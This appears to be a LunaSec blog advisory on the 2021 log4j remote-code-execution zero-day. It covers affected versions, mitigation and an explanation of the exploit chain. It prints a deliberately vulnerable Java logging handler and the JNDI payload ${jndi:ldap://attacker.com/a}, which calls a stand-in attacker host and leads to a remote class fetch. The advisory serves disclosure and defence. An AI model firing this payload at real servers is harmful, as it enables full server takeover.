---
title: RCE 0-day exploit found in log4j, a popular Java logging package
description: Given how ubiquitous this library is, the impact of this vulnerability is quite severe. Learn how to patch it, why it's bad, and more in this post.
slug: log4j-zero-day
authors:
- name: Free Wortley 
  title: CEO at LunaSec 
  url: https://github.com/freeqaz
  image_url: https://github.com/freeqaz.png
  tags: [zero-day, security, data-security, data-breaches]
- name: Chris Thompson
  title: Developer at Lunasec
  url: https://github.com/breadchris
  image_url: https://github.com/breadchris.png

---
<!--
  ~ Copyright by LunaSec (owned by Refinery Labs, Inc)
  ~
  ~ Licensed under the Creative Commons Attribution-ShareAlike 4.0 International
  ~ (the "License"); you may not use this file except in compliance with the
  ~ License. You may obtain a copy of the License at
  ~
  ~ https://creativecommons.org/licenses/by-sa/4.0/legalcode
  ~
  ~ See the License for the specific language governing permissions and
  ~ limitations under the License.
  ~
-->

A few hours ago, a 0-day exploit in the
popular Java logging library, `log4j`, was [tweeted](https://twitter.com/P0rZ9/status/1468949890571337731) along with a POC posted on
[GitHub](https://github.com/tangxiaofeng7/apache-log4j-poc) that results in Remote Code Execution (RCE) if
`log4j` logs an attacker-controlled string value.

Given how ubiquitous this library is, the impact of the exploit (full server control), and how easy it is to exploit,
the impact of this vulnerability is quite severe. Since this vulnerability is still very new, there isn't a CVE to track
it yet.

This post provides resources to help you understand the vulnerability and how to mitigate it for yourself.

<!--truncate-->

## Who is impacted?
Cloud services like [Steam, Apple iCloud](https://news.ycombinator.com/item?id=29499867), and apps like
Minecraft have been found to be vulnerable to this exploit. Many, many others likely are, also.

Anybody using Apache Struts is likely vulnerable. We've seen similar vulnerabilities exploited before in breaches like 
the [2017 Equifax data breach](https://en.wikipedia.org/wiki/2017_Equifax_data_breach#Data_breach).

Many Open Source projects
like the Minecraft server, [Paper](https://github.com/PaperMC/Paper/commit/b475c6a683fa34156b964f751985f36a784ca0e0),
have already begun patching their usage of `log4j`.

## Affected Apache log4j Versions

`2.0 <= Apache log4j <= 2.14.1`

At the time this post was created (December 9th, 2021) a patch is available in `log4j-2.15.0-rc1`
[here](https://github.com/apache/logging-log4j2/releases/tag/log4j-2.15.0-rc1).

## Temporary Mitigation

Start your server with `log4j2.formatMsgNoLookups` set to `true`, or update to `log4j-2.15.0-rc1` or later. 
(Kudos to @80vul for [tweeting](https://twitter.com/80vul/status/1468968891489857537))

## How the exploit works

### Exploit Requirements 
- A server running with a vulnerable `log4j` version (listed above),
- A remotely accessible endpoint with any protocol (HTTP, TCP, etc) that allows an attacker to send arbitrary data,
- A log statement in the endpoint that logs the attacker controlled data.

### Example Vulnerable Code

```java
import org.apache.log4j.Logger;

import java.io.*;
import java.sql.SQLException;
import java.util.*;

public class VulnerableLog4jExampleHandler implements HttpHandler {

  static Logger log = Logger.getLogger(log4jExample.class.getName());

  /**
   * A simple HTTP endpoint that reads the request's User Agent and logs it back.
   * This is basically pseudo-code to explain the vulnerability, and not a full example.
   * @param he HTTP Request Object
   */
  public void handle(HttpExchange he) throws IOException {
    string userAgent = he.getRequestHeader("user-agent");
    
    // This line triggers the RCE by logging the attacker-controlled HTTP User Agent header.
    // The attacker can set their User-Agent header to: ${jndi:ldap://attacker.com/a}
    log.info("Request User Agent:" + userAgent);

    String response = "<h1>Hello There, " + userAgent + "!</h1>";
    he.sendResponseHeaders(200, response.length());
    OutputStream os = he.getResponseBody();
    os.write(response.getBytes());
    os.close();
  }
}
```

### Exploit Steps
1. Data from the User gets sent to the server (via any protocol),
2. The server logs the data in the request, containing the malicious payload: `${jndi:ldap://attacker.com/a}` (where `attacker.com` is an attacker controlled server),
3. The `log4j` vulnerability is triggered by this payload and the server makes a request to `attacker.com` via "[Java Naming and Directory Interface](https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf)" (JNDI),
4. This response contains a path to a remote Java class file (ex. `http://second-stage.attacker.com/Exploit.class`) which is injected into the server process,
5. This injected payload triggers a second stage, and allows an attacker to execute arbitrary code.

Due to how common Java vulnerabilities such as these are, security researchers have created tools to easily exploit 
them. The [marshalsec](https://github.com/mbechler/marshalsec) project is one of many that demonstrates generating an
exploit payload that could be used for this vulnerability. You can refer to [this malicious LDAP server](https://github.com/mbechler/marshalsec/blob/master/src/main/java/marshalsec/jndi/LDAPRefServer.java) for an example of exploitation. 

## More information

We'll continue to update this post as information about the impact of this exploit becomes available.

For now, we're just publishing this to help raise awareness and get people patching it. Please tell any of your friends 
running Java software!
